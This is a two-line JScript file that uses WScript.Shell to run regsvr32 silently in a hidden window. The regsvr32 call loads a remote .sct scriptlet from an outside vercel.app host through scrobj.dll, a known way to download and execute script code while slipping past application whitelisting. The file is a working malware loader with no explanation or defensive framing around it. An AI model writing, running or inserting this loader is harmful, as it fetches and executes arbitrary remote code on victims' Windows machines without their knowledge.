var shell = new ActiveXObject("WScript.Shell");
shell.Run("regsvr32 /s /n /u /i:https://testando123-blond.vercel.app/script.sct scrobj.dll", 0, false);
